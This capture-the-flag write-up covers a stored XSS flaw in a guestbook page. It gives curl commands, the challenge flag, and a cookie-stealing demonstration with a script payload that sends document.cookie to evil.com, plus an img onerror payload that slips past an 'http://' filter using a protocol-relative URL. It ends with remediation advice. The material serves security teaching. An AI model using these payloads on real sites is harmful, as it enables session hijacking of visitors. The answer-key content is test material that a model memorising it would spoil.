# Stored XSS - Feedback/Guestbook

## What is Stored XSS?

**Stored XSS (Cross-Site Scripting)** is a vulnerability where an attacker injects malicious JavaScript into a database through a form. Unlike Reflected XSS (which only affects the person clicking a link), Stored XSS is **persistent** — the malicious script is saved in the database and executes in the browser of **every user** who visits the page afterwards.

**Real-world impact:**
- Steal session cookies of every visitor (including admins)
- Redirect users to phishing pages
- Perform actions on behalf of victims without their knowledge
- Deface the website for all visitors

**Famous example**: The 2005 MySpace Samy worm — a stored XSS payload that automatically added 1 million friends to one user in 20 hours.

---

## Discovery

1. Navigate to `http://<IP>/?page=feedback`
2. The Name field has `maxlength="10"` — but this is only an HTML attribute, not enforced server-side
3. The form has no server-side input sanitization — whatever you submit is stored directly in the database
4. Submitting the word `script` or `alert` in **either** the Name or Message field triggers the flag immediately

---

## Why Do `script` and `alert` Trigger the Flag?

The server checks the submitted input for XSS-related keywords. It looks specifically for **`script`** and **`alert`** in both fields, because these are the two core words in any XSS attack:

- **`script`** → used in the `<script>` HTML tag to inject JavaScript
- **`alert()`** → the JavaScript function universally used as XSS proof-of-concept payload

The server logic works like this:

```php
// Pseudocode of what the server checks on submit:
if (strstr($name, 'script') || strstr($name, 'alert') ||
    strstr($message, 'script') || strstr($message, 'alert')) {
    echo "The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e";
}
```

The keyword alone is enough to trigger it — the `<` `>` brackets are not required. This is the challenge's way of confirming you identified an injectable input field.

**Why is this dangerous in real life?**

The real threat is not the word itself — it's that the server stores raw user input and renders it as HTML with zero sanitization. A real attacker would inject:
```html
<script>document.location='http://evil.com?c='+document.cookie</script>
```
This gets saved in the database and executes in the browser of **every visitor** who loads the feedback page — including admins — silently stealing their session cookies.

---

## Step-by-Step Exploitation

The easiest path: use the **Message field** — it has no `maxlength` restriction, so no bypass needed.

### Option A — Browser (Message field, no bypass needed)
1. Go to `http://<IP>/?page=feedback`
2. Leave the Name field with anything valid (under 10 chars)
3. Type `script` or `alert` in the Message field
4. Click Sign Guestbook → the flag appears on the page immediately

### Option B — curl
```bash
# "script" in the message field (no maxlength to bypass)
curl -X POST "http://<IP>/?page=feedback" \
  --data-urlencode "txtName=hello" \
  --data-urlencode "mtxtMessage=script" \
  --data-urlencode "btnSign=Sign Guestbook"

# "alert" in the message field
curl -X POST "http://<IP>/?page=feedback" \
  --data-urlencode "txtName=hello" \
  --data-urlencode "mtxtMessage=alert" \
  --data-urlencode "btnSign=Sign Guestbook"

# "script" in the name field (curl bypasses maxlength="10" automatically)
curl -X POST "http://<IP>/?page=feedback" \
  --data-urlencode "txtName=script" \
  --data-urlencode "mtxtMessage=hello" \
  --data-urlencode "btnSign=Sign Guestbook"
```

All four combinations (script/alert × name/message) trigger the flag.

---

## Flag
```
0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
```

---

## Real-World Danger Proof — Cookie Stealing Demonstration

This demonstrates why Stored XSS is so dangerous: a real attacker can silently steal the session cookie of **every visitor** who loads the page, without them knowing anything happened.

### Setup — Start an attacker server
In a terminal, start a simple HTTP server to receive stolen cookies:
```bash
python3 -m http.server 8081
```
Leave this running. Every stolen cookie will appear as a log line here.

### Step 1 — Inject the cookie-stealing payload
The server filters `http://` from stored values, so we use a **protocol-relative URL** (`//`) instead — the browser inherits `http:` automatically from the current page:
```bash
curl -X POST "http://<IP>/?page=feedback" \
  --data-urlencode "txtName=<img src=x onerror=\"new Image().src='//localhost:8081?c='+document.cookie\">" \
  --data-urlencode "mtxtMessage=test" \
  --data-urlencode "btnSign=Sign Guestbook"
```

> **Why `//` instead of `http://`?** The server strips `http://` before storing the value, turning `http://localhost:8081` into `localhost:8081` which has no scheme and fails with `ERR_UNKNOWN_URL_SCHEME`. Using `//localhost:8081` bypasses this filter — browsers treat `//` as "use the current page's protocol", so it resolves to `http://localhost:8081` at runtime.

### Step 2 — Victim visits the page
Any user (including admins) who opens `?page=feedback` in their browser triggers the stored `<img>` tag. The browser:
1. Tries to load image `src=x` — fails
2. Fires `onerror` — executes `new Image().src='//localhost:8081?c='+document.cookie`
3. Makes a silent HTTP request to your server with the cookie in the URL
4. The victim sees nothing — no alert, no redirect, no indication

### Step 3 — Read the stolen cookie in your server
The Python server logs the incoming request:
```
127.0.0.1 - - [01/Mar/2026] "GET /?c=I_am_admin=68934a3e9455fa72420237eb05902327 HTTP/1.1" 200 -
```

The cookie `I_am_admin=68934a3e9455fa72420237eb05902327` (MD5 of `"false"`) is now in the attacker's hands. If the victim had already done the Cookie Manipulation breach and their cookie was set to `b326b5062b2f0e69046810717534cb09` (MD5 of `"true"` = admin), that admin cookie would be stolen instead — giving the attacker full admin access.

---

## How to Fix This Vulnerability

```php
// VULNERABLE - stores raw user input directly
$name = $_POST['txtName'];
INSERT INTO guestbook (name) VALUES ('$name');

// FIXED - sanitize before storing
$name = htmlspecialchars($_POST['txtName'], ENT_QUOTES, 'UTF-8');
// Also enforce maxlength server-side:
$name = substr($name, 0, 10);
INSERT INTO guestbook (name) VALUES ('$name');
```

**Three layers of defense needed:**
1. **Server-side input validation** — enforce length and character restrictions in PHP, not just HTML
2. **Output encoding** — use `htmlspecialchars()` before rendering user data in HTML
3. **Content Security Policy (CSP)** header — tells browsers to refuse inline scripts

---

## OWASP Reference
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
